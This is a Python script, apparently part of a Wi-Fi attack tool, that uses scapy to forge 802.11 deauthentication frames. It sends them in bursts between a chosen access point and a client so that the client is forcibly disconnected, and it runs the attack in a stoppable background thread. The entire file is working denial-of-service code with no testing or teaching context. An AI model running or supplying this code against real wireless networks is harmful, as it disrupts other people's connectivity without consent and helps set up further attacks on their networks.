import time
import threading
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, Dot11ProbeResp, RadioTap, Dot11Deauth

# Global variables for thread management
attack_thread = None
stop_flag = threading.Event()

def create_deauth_packet(target_mac, ap_bssid, reason_code=7):
    """
    Create deauth packets - improved version with both directions
    Args:
        target_mac (str): Target client MAC
        ap_bssid (str): AP BSSID
        reason_code (int): Deauth reason code
    Returns:
        tuple: (packet_to_client, packet_to_ap)
    """
    # Packet from AP to client (kick client)
    pkt_to_client = RadioTap() / Dot11(
        addr1=target_mac,  # Destination (client)
        addr2=ap_bssid,    # Source (AP)
        addr3=ap_bssid     # BSSID
    ) / Dot11Deauth(reason=reason_code)
    
    # Packet from client to AP (tell AP to forget client)
    pkt_to_ap = RadioTap() / Dot11(
        addr1=ap_bssid,    # Destination (AP)
        addr2=target_mac,  # Source (client)
        addr3=ap_bssid     # BSSID
    ) / Dot11Deauth(reason=reason_code)
    
    return pkt_to_client, pkt_to_ap

def deauth_attack(target_mac, ap_bssid, interface, attack_duration=30):
    """
    Perform targeted deauth attack - improved version
    Args:
        target_mac (str): Target client MAC
        ap_bssid (str): AP BSSID
        interface (str): Network interface
        attack_duration (int): Attack duration in seconds
    """
    print(f"\n[ATTACK] Starting targeted deauth attack")
    print(f"[TARGET] Client: {target_mac}")
    print(f"[TARGET] AP: {ap_bssid}")
    print(f"[DURATION] {attack_duration} seconds")
    print("[INFO] Attack in progress...")
    
    start_time = time.time()
    packets_sent = 0
    
    # Clear the stop flag before starting
    stop_flag.clear()
    
    while time.time() - start_time < attack_duration:
        # Check if we should stop
        if stop_flag.is_set():
            print("\n[INFO] Stop signal received")
            break
            
        try:
            # Create deauth packets
            pkt_to_client, pkt_to_ap = create_deauth_packet(target_mac, ap_bssid)
            
            # Send burst of packets
            for _ in range(5):  # Send 5 packets quickly
                sendp(pkt_to_client, iface=interface, verbose=False)
                sendp(pkt_to_ap, iface=interface, verbose=False)
                packets_sent += 2
            
            time.sleep(0.1)  # Brief pause between bursts
                
        except Exception as e:
            print(f"[ERROR] Error during deauth attack: {e}")
            break
    
    print(f"\n[COMPLETE] Deauth attack finished. Sent {packets_sent} packets")

def start_attack(target_mac, ap_bssid, interface, attack_duration=30):
    """
    Start deauth attack in separate thread
    Args:
        target_mac (str): Target client MAC
        ap_bssid (str): AP BSSID
        interface (str): Network interface
        attack_duration (int): Attack duration
    Returns:
        bool: True if attack started successfully
    """
    global attack_thread, stop_flag
    
    # Stop any existing attack
    if is_attack_running():
        print("[WARNING] Previous attack still running, stopping it first...")
        stop_attack()
    
    # Clear the stop flag
    stop_flag.clear()
    
    # Start new attack thread
    attack_thread = threading.Thread(
        target=deauth_attack,
        args=(target_mac, ap_bssid, interface, attack_duration)
    )
    attack_thread.daemon = True
    attack_thread.start()
    
    return True

def stop_attack():
    """Stop the current attack"""
    global attack_thread, stop_flag
    
    if not is_attack_running():
        print("[INFO] No attack is currently running")
        return False
    
    print("[INFO] Stopping attack...")
    
    # Signal the thread to stop
    stop_flag.set()
    
    # Wait for thread to finish (with timeout)
    if attack_thread and attack_thread.is_alive():
        attack_thread.join(timeout=5)
        
        if attack_thread.is_alive():
            print("[WARNING] Attack thread did not stop cleanly")
            return False
    
    print("[INFO] Attack stopped successfully")
    return True

def is_attack_running():
    """Check if an attack is currently running"""
    global attack_thread
    return attack_thread is not None and attack_thread.is_alive()